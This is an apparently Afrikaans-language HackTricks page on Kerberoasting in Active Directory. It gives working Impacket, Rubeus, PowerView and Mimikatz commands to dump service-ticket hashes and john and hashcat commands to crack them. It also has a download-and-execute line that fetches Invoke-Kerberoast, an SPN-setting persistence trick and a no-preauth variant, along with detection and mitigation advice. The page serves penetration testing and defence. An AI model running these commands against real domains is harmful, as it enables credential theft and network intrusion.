# Kerberoast

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) om maklik en **outomatiese werksvloei** te bou wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskaplike gereedskap.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

<details>

<summary><strong>Leer AWS hak van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy geadverteer wil sien in HackTricks** of **HackTricks in PDF wil aflaai** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord groep**](https://discord.gg/hRep4RUj7f) of die [**telegram groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PRs in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kerberoast

Kerberoasting fokus op die verkryging van **TGS-tikette**, spesifiek dié wat verband hou met dienste wat onder **gebruikersrekeninge** in **Active Directory (AD)** werk, met uitsluiting van **rekenaargebruikersrekeninge**. Die versleuteling van hierdie tikette maak gebruik van sleutels wat afkomstig is van **gebruiker wagwoorde**, wat die moontlikheid van **offline geloofsbriekkraak** bied. Die gebruik van 'n gebruikersrekening as 'n diens word aangedui deur 'n nie-leë **"ServicePrincipalName"** eienskap.

Vir die uitvoering van **Kerberoasting** is 'n domeinrekening wat in staat is om **TGS-tikette** aan te vra noodsaaklik; hierdie proses vereis egter nie **spesiale voorregte** nie, wat dit toeganklik maak vir enigiemand met **geldige domeinlegitimasie**.

### Sleutelpunte:

* **Kerberoasting** teiken **TGS-tikette** vir **gebruikersrekeningdienste** binne **AD**.
* Tikette wat versleutel is met sleutels van **gebruiker wagwoorde** kan **offline gekraak** word.
* 'n Diens word geïdentifiseer deur 'n **ServicePrincipalName** wat nie nul is nie.
* **Geen spesiale voorregte** is nodig nie, net **geldige domeinlegitimasie**.

### **Aanval**

{% hint style="warning" %}
**Kerberoasting gereedskappe** vra gewoonlik **`RC4-versleuteling`** aan wanneer die aanval uitgevoer word en TGS-REQ-versoeke geïnisieer word. Dit is omdat **RC4** [**swakker**](https://www.stigviewer.com/stig/windows\_10/2017-04-28/finding/V-63795) is en makliker offline gekraak kan word met gereedskappe soos Hashcat as ander versleutelingsalgoritmes soos AES-128 en AES-256.\
RC4 (tipe 23) hasings begin met **`$krb5tgs$23$*`** terwyl AES-256(tipe 18) begin met **`$krb5tgs$18$*`**`.
{% endhint %}

#### **Linux**
```bash
# Metasploit framework
msf> use auxiliary/gather/get_user_spns
# Impacket
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN.FULL>/<USERNAME> -outputfile hashes.kerberoast # Password will be prompted
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USERNAME> -outputfile hashes.kerberoast
# kerberoast: https://github.com/skelsec/kerberoast
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -o kerberoastable # 1. Enumerate kerberoastable users
kerberoast spnroast 'kerberos+password://<DOMAIN.FULL>\<USERNAME>:<PASSWORD>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes # 2. Dump hashes
```
Multi-funksie gereedskap insluitend 'n dump van kerberoastbare gebruikers:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN.FULL> -ip <DC_IP> -u <USERNAME> -p <PASSWORD> -c
```
#### Windows

* **Lys Kerberoastbare gebruikers op**
```powershell
# Get Kerberoastable users
setspn.exe -Q */* #This is a built-in binary. Focus on user accounts
Get-NetUser -SPN | select serviceprincipalname #Powerview
.\Rubeus.exe kerberoast /stats
```
* **Tegniek 1: Vra vir TGS en dump dit uit die geheue**
```powershell
#Get TGS in memory from a single user
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ServicePrincipalName" #Example: MSSQLSvc/mgmt.domain.local

#Get TGSs for ALL kerberoastable accounts (PCs included, not really smart)
setspn.exe -T DOMAIN_NAME.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

#List kerberos tickets in memory
klist

# Extract them from memory
Invoke-Mimikatz -Command '"kerberos::list /export"' #Export tickets to current folder

# Transform kirbi ticket to john
python2.7 kirbi2john.py sqldev.kirbi
# Transform john to hashcat
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
* **Tegniek 2: Outomatiese gereedskappe**
```bash
# Powerview: Get Kerberoast hash of a user
Request-SPNTicket -SPN "<SPN>" -Format Hashcat #Using PowerView Ex: MSSQLSvc/mgmt.domain.local
# Powerview: Get all Kerberoast hashes
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast #Specific user
.\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap #Get of admins

# Invoke-Kerberoast
iex (new-object Net.WebClient).DownloadString("https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1")
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
```
{% hint style="warning" %}
Wanneer 'n TGS aangevra word, word Windows-gebeurtenis `4769 - 'n Kerberos-dienskaartjie is aangevra` gegenereer.
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) om maklik **werkstrome te bou** en outomatiseer wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapsinstrumente.\
Kry Toegang Vandag:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}

### Kraak
```bash
john --format=krb5tgs --wordlist=passwords_kerb.txt hashes.kerberoast
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords_kerb.txt
./tgsrepcrack.py wordlist.txt 1-MSSQLSvc~sql01.medin.local~1433-MYDOMAIN.LOCAL.kirbi
```
### Volharding

Indien jy genoeg **regte** oor 'n gebruiker het, kan jy dit **kerberoastable** maak:
```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='just/whateverUn1Que'} -verbose
```
Jy kan nuttige **gereedskap** vir **kerberoast** aanvalle hier vind: [https://github.com/nidem/kerberoast](https://github.com/nidem/kerberoast)

As jy hierdie **fout** vanaf Linux vind: **`Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)`** is dit as gevolg van jou plaaslike tyd, jy moet die gasheer synchroniseer met die DC. Daar is 'n paar opsies:

* `ntpdate <IP van DC>` - Verouderd vanaf Ubuntu 16.04
* `rdate -n <IP van DC>`

### Versagting

Kerberoasting kan met 'n hoë graad van heimlikheid uitgevoer word as dit uitgebuit kan word. Om hierdie aktiwiteit op te spoor, moet aandag geskenk word aan **Sekuriteitsgebeurtenis ID 4769**, wat aandui dat 'n Kerberos-kaartjie aangevra is. Tog, as gevolg van die hoë frekwensie van hierdie gebeurtenis, moet spesifieke filters toegepas word om verdagte aktiwiteite te isoleer:

* Die diensnaam moet nie **krbtgt** wees nie, aangesien dit 'n normale versoek is.
* Diensname wat eindig met **$** moet uitgesluit word om insluiting van rekenaarrekeninge wat vir dienste gebruik word, te voorkom.
* Versoeke vanaf rekenaars moet gefiltreer word deur rekeningname wat geformateer is as **rekenaar@domain** uit te sluit.
* Slegs suksesvolle kaartjieversoeke moet oorweeg word, geïdentifiseer deur 'n mislukkingskode van **'0x0'**.
* **Die belangrikste**, die kaartjieversleutelingstipe moet **0x17** wees, wat dikwels in Kerberoasting aanvalle gebruik word.
```bash
Get-WinEvent -FilterHashtable @{Logname='Security';ID=4769} -MaxEvents 1000 | ?{$_.Message.split("`n")[8] -ne 'krbtgt' -and $_.Message.split("`n")[8] -ne '*$' -and $_.Message.split("`n")[3] -notlike '*$@*' -and $_.Message.split("`n")[18] -like '*0x0*' -and $_.Message.split("`n")[17] -like "*0x17*"} | select ExpandProperty message
```
Om die risiko van Kerberoasting te verminder:

* Verseker dat **Diensrekeningwagwoorde moeilik is om te raai**, met 'n aanbeveling van 'n lengte van meer as **25 karakters**.
* Maak gebruik van **Bestuurde Diensrekeninge**, wat voordele soos **outomatiese wagwoordveranderinge** en **gedelegerde Diensprinsipaalnaam (SPN) Bestuur** bied, wat die sekuriteit teen sulke aanvalle verbeter.

Deur hierdie maatreëls te implementeer, kan organisasies die risiko wat met Kerberoasting geassosieer word aansienlik verminder.

## Kerberoast sonder domeinrekening

In **September 2022** is 'n nuwe manier om 'n stelsel te benut aan die lig gebring deur 'n navorser genaamd Charlie Clark, gedeel deur sy platform [exploit.ph](https://exploit.ph/). Hierdie metode maak die verkryging van **Dienskaartjies (ST)** moontlik deur 'n **KRB\_AS\_REQ** versoek, wat opmerklik nie beheer oor enige Aktiewe Gids-rekening vereis nie. In wese, as 'n hoof so opgestel is dat dit nie voor-verifikasie vereis nie—'n scenario soortgelyk aan wat in die sibersekuriteitswêreld bekend staan as 'n **AS-REP Roasting-aanval**—kan hierdie eienskap benut word om die versoekproses te manipuleer. Spesifiek, deur die **sname** kenmerk binne die versoek se liggaam te verander, word die stelsel mislei om 'n **ST** uit te reik eerder as die standaard versleutelde Kaartjieverleningkaartjie (TGT).

Die tegniek word volledig verduidelik in hierdie artikel: [Semperis blogpos](https://www.semperis.com/blog/new-attack-paths-as-requested-sts/).

{% hint style="warning" %}
Jy moet 'n lys van gebruikers voorsien omdat ons nie 'n geldige rekening het om die LDAP te ondervra deur hierdie tegniek te gebruik nie.
{% endhint %}

#### Linux

* [impacket/GetUserSPNs.py van PR #1413](https://github.com/fortra/impacket/pull/1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile "LIST_USERS" -dc-host "dc.domain.local" "domain.local"/
```
#### Windows

* [GhostPack/Rubeus van PR #139](https://github.com/GhostPack/Rubeus/pull/139):
```bash
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:"domain.local" /dc:"dc.domain.local" /nopreauth:"NO_PREAUTH_USER" /spn:"TARGET_SERVICE"
```
## Verwysings

* [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)

<details>

<summary><strong>Leer AWS hakwerk vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat** Kyk na die [**INSKRYWINGSPLANNE**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**Die PEASS Familie**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** 💬 [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** ons op **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Deel jou haktruuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Gebruik [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=kerberoast) om maklik te bou en **werkstrome outomatiseer** wat aangedryf word deur die wêreld se **mees gevorderde** gemeenskapshulpmiddels.\
Kry Vandag Toegang:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=kerberoast" %}
